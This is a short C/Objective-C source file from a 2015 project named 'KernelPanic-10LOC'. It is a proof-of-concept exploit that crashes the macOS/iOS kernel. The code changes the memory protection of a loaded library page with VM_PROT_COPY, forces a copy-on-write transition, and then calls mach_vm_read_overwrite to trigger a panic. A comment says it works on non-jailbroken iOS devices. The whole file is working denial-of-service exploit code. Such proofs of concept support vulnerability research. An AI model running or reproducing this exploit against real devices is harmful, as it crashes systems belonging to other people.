//
//  main.m
//  KernelPanic-10LOC
//
//  Created by João D. Moreira on 21/02/15.
//  Copyright (c) 2015 goldnpot. All rights reserved.
//


#include <unistd.h>
#include <mach/mach.h>
#include "mach_vm.h"
#include <mach-o/dyld.h>

int
main (int argc, char * argv[])
{
    volatile char * library;
    const mach_vm_size_t page_size = getpagesize ();
    const mach_vm_size_t buffer_size = 3 * page_size;
    char buffer[buffer_size];
    mach_vm_size_t result_size;
    library = (char *) _dyld_get_image_header (1);
    mach_vm_protect (mach_task_self (), (mach_vm_address_t) (library + page_size), page_size, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY); /* VM_PROT_EXECUTE omitted for non-jb iOS devices */
    library[page_size]++; /* COW -> PRV transition   */
    library[page_size]--; /* undo dummy-modification */
    result_size = 0;
    /* panic! */
    mach_vm_read_overwrite (mach_task_self (), (mach_vm_address_t) library, buffer_size, (mach_vm_address_t) buffer, &result_size);
    
    return 0;
}
